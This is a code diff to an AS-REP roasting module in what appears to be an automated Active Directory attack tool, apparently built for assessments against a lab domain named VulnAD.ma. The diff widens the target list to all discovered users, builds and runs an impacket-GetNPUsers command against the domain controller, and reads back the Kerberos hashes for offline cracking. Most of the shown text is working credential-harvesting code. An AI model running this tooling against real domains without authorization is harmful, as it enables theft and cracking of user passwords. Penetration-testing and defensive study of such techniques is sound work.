@@ -154,44 +154,50 @@ class ASREPRoastingModule:
         domain   = state.domain
         warnings: list[str] = []
 
-        # ── Choose mode: targeted (known AS-REP users) vs broad ────────
-        if state.asrep_users:
-            mode       = "targeted"
-            user_pool  = state.asrep_users
+        # ── Build the broadest possible user pool ──────────────────────
+        # Always test ALL known users — LDAP's DONT_REQUIRE_PREAUTH detection
+        # can flag wrong accounts.  Let impacket determine who is roastable.
+        # state.asrep_users is kept for informational display only.
+        #
+        # Priority: state.users (full list) > state.asrep_users > disk files
+        if state.asrep_users and not state.users:
+            # Only LDAP-flagged users known — use them but warn
+            mode      = "targeted"
+            user_pool = list(state.asrep_users)
             warnings.append(
-                f"Targeted mode: {len(user_pool)} known AS-REP-roastable user(s) "
-                "from LDAP enumeration."
+                f"Targeted mode: {len(user_pool)} AS-REP-flagged user(s) from LDAP. "
+                "Run SMB RID brute or LDAP enum to get the full user list."
             )
         elif state.users:
+            # Full user list available — always prefer this
             mode      = "broad"
-            user_pool = state.users
-            warnings.append(
-                f"Broad mode: testing all {len(user_pool)} discovered users. "
-                "Run LDAP enumeration first to narrow this list."
-            )
+            user_pool = list(state.users)
+            if state.asrep_users:
+                warnings.append(
+                    f"Broad mode: testing all {len(user_pool)} users "
+                    f"(LDAP flagged {len(state.asrep_users)} as AS-REP roastable — "
+                    "impacket will confirm)."
+                )
+            else:
+                warnings.append(f"Broad mode: testing all {len(user_pool)} discovered users.")
         else:
             # Fallback: try loading from generated/ files on disk
             from modules.file_export import load_asrep_targets, load_users_all
-            disk_asrep = load_asrep_targets()
             disk_users = load_users_all()
-            if disk_asrep:
-                mode      = "targeted"
-                user_pool = disk_asrep
-                state.asrep_users = disk_asrep
-                warnings.append(
-                    f"Loaded {len(disk_asrep)} AS-REP targets from generated/users-asrep.txt."
-                )
-            elif disk_users:
+            disk_asrep = load_asrep_targets()
+            if disk_users:
                 mode      = "broad"
                 user_pool = disk_users
                 state.users = disk_users
-                warnings.append(
-                    f"Loaded {len(disk_users)} users from generated/users-all.txt."
-                )
+                warnings.append(f"Loaded {len(disk_users)} users from generated/users-all.txt.")
+            elif disk_asrep:
+                mode      = "targeted"
+                user_pool = disk_asrep
+                state.asrep_users = disk_asrep
+                warnings.append(f"Loaded {len(disk_asrep)} AS-REP targets from generated/users-asrep.txt.")
             else:
                 return self._error(
-                    "No user list available. Run SMB RID brute force or LDAP enumeration first. "
-                    "(Generates generated/users-all.txt automatically.)"
+                    "No user list available. Run SMB RID brute force or LDAP enumeration first."
                 )
 
         # ── Write temp user list ────────────────────────────────────────
@@ -201,66 +207,58 @@ class ASREPRoastingModule:
         )
         _write_userlist(user_pool, tmp_path)
 
-        # Determine output hash file path up front so we can pass it to the
-        # command AND read it back after execution.
+        # Output hash file — impacket writes hashes HERE, not to stdout.
         os.makedirs(REPORTS_DIR, exist_ok=True)
         hash_file_path = os.path.abspath(
             os.path.join(REPORTS_DIR, f"{state.assessment_id}-asrep.txt")
         )
 
         # ── Run GetNPUsers ──────────────────────────────────────────────
-        # Matches the user's working playbook command:
-        #   impacket-GetNPUsers VulnAD.ma/ -usersfile users.txt -dc-ip <IP> -no-pass
+        # Exact working command (no -dc-ip, no -no-pass — matches manual):
+        #   impacket-GetNPUsers VulnAd.ma/ -usersfile users-rid.txt
         #
-        # IMPORTANT: do NOT use -outputfile /dev/null — impacket writes hashes
-        # to the output file, NOT to stdout.  We point it at the real report file
-        # so we can read hashes back from disk.
+        # -outputfile points at the real report file so hashes are read back.
         command = [
             binary,
             f"{domain}/",
-            "-usersfile", tmp_path,
-            "-dc-ip",     target,
-            "-no-pass",
+            "-usersfile",  tmp_path,
             "-outputfile", hash_file_path,
         ]
 
         from rich.console import Console as _RCon
         _RCon().print(
-            f"  [dim]Command: {binary} {domain}/ -usersfile <users.txt> "
-            f"-dc-ip {target} -no-pass -outputfile <hash_file>[/dim]"
+            f"  [dim]Command: {binary} {domain}/ "
+            f"-usersfile <{len(user_pool)} users> "
+            f"-outputfile <hash_file>[/dim]"
         )
 
         result   = self.executor.run(command)
         combined = result["output"] + "\n" + result["error"]
 
-        # ── Parse hashes (file first, stdout fallback) ──────────────────
-        # GetNPUsers writes hashes to -outputfile; stdout just shows progress.
-        # Always try reading the file; also scan stdout in case the binary
-        # behaves differently on this install.
+        # ── Parse hashes ────────────────────────────────────────────────
+        # Primary: read the -outputfile impacket wrote to.
+        # Fallback: scan stdout/stderr (some impacket versions differ).
         hashes: list[str] = []
 
         if os.path.isfile(hash_file_path):
             try:
                 with open(hash_file_path, "r", encoding="utf-8", errors="replace") as fh:
-                    file_content = fh.read()
-                hashes = _parse_hashes(file_content)
+                    hashes = _parse_hashes(fh.read())
             except OSError:
                 pass
 
         if not hashes:
-            # Fallback: parse stdout/stderr directly
             hashes = _parse_hashes(combined)
 
         vulnerable_users = _parse_vulnerable_users("\n".join(hashes))
 
         if not hashes:
-            # Check for common error patterns to give actionable warnings
             if "kerberos sessionerror" in combined.lower():
-                warnings.append("Kerberos session error — DC may be unreachable or domain incorrect.")
+                warnings.append("Kerberos session error — DC unreachable or domain name wrong.")
             if "clock skew" in combined.lower():
-                warnings.append("Clock skew too large — sync time with DC: sudo ntpdate " + target)
+                warnings.append(f"Clock skew too large — run: sudo ntpdate {target}")
             if "connection refused" in combined.lower() or "timed out" in combined.lower():
-                warnings.append(f"Cannot reach DC on port 88 — verify {target} is correct and port 88 is open.")
+                warnings.append(f"Cannot reach DC on port 88 — verify {target} and port 88.")
             return {
                 "status":           "success",
                 "hashes":           [],
@@ -271,8 +269,8 @@ class ASREPRoastingModule:
                 "raw_output":       combined,
                 "error":            None,
                 "warnings":         warnings + [
-                    "No AS-REP hashes returned — either all accounts require pre-auth, "
-                    "or the DC blocked the request.",
+                    "No AS-REP hashes returned — no accounts have pre-auth disabled, "
+                    "or impacket could not reach the DC.",
                 ],
             }
 
